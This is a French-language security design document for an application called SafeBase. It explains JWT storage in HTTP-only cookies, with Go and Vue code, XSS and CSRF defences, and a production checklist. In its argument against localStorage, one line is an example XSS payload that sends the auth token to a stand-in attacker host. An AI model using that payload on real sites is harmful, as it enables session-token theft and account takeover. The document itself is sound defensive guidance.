# 🔒 Implémentation de la Sécurité - SafeBase

## Architecture d'Authentification Sécurisée

### Principe Général

SafeBase utilise une architecture d'authentification moderne et sécurisée basée sur **JWT (JSON Web Tokens)** stockés dans des **cookies HTTP-only**, offrant une protection maximale contre les attaques courantes.

---

## 🛡️ Sécurité des Tokens JWT

### 1. Stockage Sécurisé via Cookies HTTP-Only

#### Pourquoi PAS localStorage ?

❌ **localStorage est VULNÉRABLE aux attaques XSS** :
- Accessible via JavaScript (`localStorage.getItem()`)
- Si un attaquant injecte du code malveillant (XSS), il peut voler le token
- Exemple d'attaque : `<script>fetch('https://attacker.com?token=' + localStorage.getItem('auth_token'))</script>`

#### ✅ Solution : Cookies HTTP-Only

Les cookies HTTP-only offrent plusieurs protections :

1. **Inaccessibles via JavaScript**
   - `document.cookie` ne peut pas lire les cookies HTTP-only
   - Protection contre les attaques XSS

2. **Envoyés automatiquement**
   - Le navigateur envoie le cookie avec chaque requête vers le domaine
   - Pas besoin de gestion manuelle côté frontend

3. **Options de sécurité supplémentaires**
   - `Secure` : Uniquement via HTTPS en production
   - `SameSite` : Protection contre les attaques CSRF
   - `Domain` et `Path` : Limitation de la portée

### 2. Implémentation Backend (Go)

#### Configuration du Cookie lors du Login

```go
// backend/internal/handlers/auth_handler.go
isProduction := os.Getenv("GO_ENV") == "production"
c.SetCookie(
    "auth_token",                // Nom du cookie
    token,                       // JWT token
    int(24*time.Hour.Seconds()), // Durée de vie : 24h
    "/",                         // Path : toute l'application
    "",                          // Domain : domaine actuel
    isProduction,                // Secure : HTTPS en production
    true,                        // httpOnly : CRUCIAL pour la sécurité
)
```

#### Middleware d'Authentification Flexible

Le middleware accepte le token de **deux sources** (par ordre de priorité) :

```go
// backend/internal/middlewares/auth_middleware.go
func (am *AuthMiddleware) RequireAuth() gin.HandlerFunc {
    return func(c *gin.Context) {
        var token string

        // 1. Header Authorization (pour les APIs externes/mobile)
        authHeader := c.GetHeader("Authorization")
        if authHeader != "" {
            parts := strings.Split(authHeader, " ")
            if len(parts) == 2 && parts[0] == "Bearer" {
                token = parts[1]
            }
        }

        // 2. Cookie HTTP-only (pour le navigateur web - PLUS SÉCURISÉ)
        if token == "" {
            cookieToken, err := c.Cookie("auth_token")
            if err == nil && cookieToken != "" {
                token = cookieToken
            }
        }

        // Vérification du token...
    }
}
```

**Avantages de cette approche :**
- ✅ Web : Utilise automatiquement le cookie sécurisé
- ✅ Mobile/API : Peut utiliser le header Authorization
- ✅ Flexibilité sans compromis sur la sécurité

### 3. Implémentation Frontend (Vue.js + Axios)

#### Configuration Axios

```typescript
// frontend/src/api/axios.ts
export const apiClient = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true, // 🔑 CRUCIAL : Envoie les cookies avec chaque requête
  headers: {
    'Content-Type': 'application/json',
  },
})
```

**`withCredentials: true` est ESSENTIEL** :
- Indique au navigateur d'inclure les cookies dans les requêtes cross-origin
- Sans cette option, les cookies ne seraient pas envoyés

#### Flux d'Authentification

```
┌─────────────┐                 ┌─────────────┐
│   Frontend  │                 │   Backend   │
│  (Vue.js)   │                 │    (Go)     │
└──────┬──────┘                 └──────┬──────┘
       │                               │
       │  1. POST /auth/login          │
       │  { email, password }          │
       ├──────────────────────────────>│
       │                               │
       │                       2. Vérification
       │                       3. Génération JWT
       │                               │
       │  4. SetCookie HTTP-only       │
       │     + JSON { user }           │
       │<──────────────────────────────┤
       │                               │
5. Cookie stocké                       │
   automatiquement                     │
   par le navigateur                   │
       │                               │
       │  6. GET /api/databases        │
       │     Cookie: auth_token=...    │
       ├──────────────────────────────>│
       │                               │
       │                    7. Vérification JWT
       │                       depuis le cookie
       │                               │
       │  8. Réponse JSON              │
       │<──────────────────────────────┤
       │                               │
```

---

## 🔐 Protection Contre les Attaques

### 1. XSS (Cross-Site Scripting)

**Protection** : Cookie HTTP-only
- JavaScript ne peut pas accéder au token
- Même en cas d'injection de code malveillant, le token reste protégé

### 2. CSRF (Cross-Site Request Forgery)

**Protections multiples** :

1. **SameSite Cookie** (à ajouter en production) :
   ```go
   c.SetSameSite(http.SameSiteStrictMode)
   ```

2. **Vérification de l'origine** :
   - CORS configuré pour autoriser uniquement les domaines connus
   - Backend vérifie l'origine des requêtes

3. **Tokens CSRF** (recommandé pour les actions sensibles) :
   - À implémenter pour les opérations critiques (suppression, modifications)

### 3. Man-in-the-Middle (MITM)

**Protection** : HTTPS + Secure Cookie

En production :
```go
isProduction := os.Getenv("GO_ENV") == "production"
c.SetCookie(
    "auth_token",
    token,
    int(24*time.Hour.Seconds()),
    "/",
    "",
    isProduction, // true = Secure flag activé
    true,
)
```

Le flag `Secure` garantit que le cookie n'est envoyé que via HTTPS.

### 4. Token Expiration

**Protection** : Durée de vie limitée

- JWT expire après 24h
- Le backend vérifie l'expiration lors de chaque requête
- L'utilisateur doit se reconnecter régulièrement

**Recommandations futures** :
- Implémenter un système de refresh tokens
- Refresh token : longue durée (7-30 jours), stocké en HTTP-only
- Access token : courte durée (15 min), stocké en mémoire

---

## 📋 Checklist de Sécurité

### ✅ Implémenté

- [x] JWT stockés dans des cookies HTTP-only
- [x] `withCredentials: true` sur Axios
- [x] Middleware backend vérifiant le token depuis le cookie
- [x] Aucun token dans localStorage/sessionStorage
- [x] Expiration des tokens (24h)
- [x] HTTPS en production (via flag Secure)
- [x] Mots de passe hashés avec bcrypt

### 🔄 À Implémenter (Production)

- [ ] SameSite cookie attribute
- [ ] Refresh tokens pour éviter les reconnexions fréquentes
- [ ] Rate limiting sur les endpoints d'authentification
- [ ] CSRF tokens pour les actions sensibles
- [ ] Logs de sécurité (tentatives de connexion, tokens invalides)
- [ ] 2FA (Two-Factor Authentication)
- [ ] Rotation automatique des secrets JWT

---

## 🚀 Configuration pour la Production

### Variables d'Environnement

```bash
# Backend (.env)
GO_ENV=production
JWT_SECRET=<SECRET_FORT_ALEATOIRE_64_CARACTERES>
DB_HOST=<db_host>
DB_PORT=5432
DB_USER=<db_user>
DB_PASSWORD=<DB_PASSWORD_FORT>
DB_NAME=safebase_prod
```

### Recommandations

1. **JWT Secret** :
   - Générer un secret aléatoire fort (64+ caractères)
   - Ne JAMAIS commiter le secret dans Git
   - Utiliser un gestionnaire de secrets (AWS Secrets Manager, Vault, etc.)

2. **HTTPS** :
   - Utiliser un certificat SSL/TLS valide
   - Forcer la redirection HTTP → HTTPS
   - Activer HSTS (HTTP Strict Transport Security)

3. **CORS** :
   - Limiter les origines autorisées
   - Ne pas utiliser `*` en production

4. **Base de données** :
   - Utiliser des mots de passe forts
   - Chiffrer les connexions (SSL)
   - Sauvegardes régulières et chiffrées

---

## 📚 Ressources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Cookie Security](https://owasp.org/www-community/controls/SecureFlag)
- [CORS Configuration](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

## 🤝 Contribution

Pour toute question de sécurité, veuillez consulter [SECURITY.md](./SECURITY.md) pour les instructions de rapport de vulnérabilités.

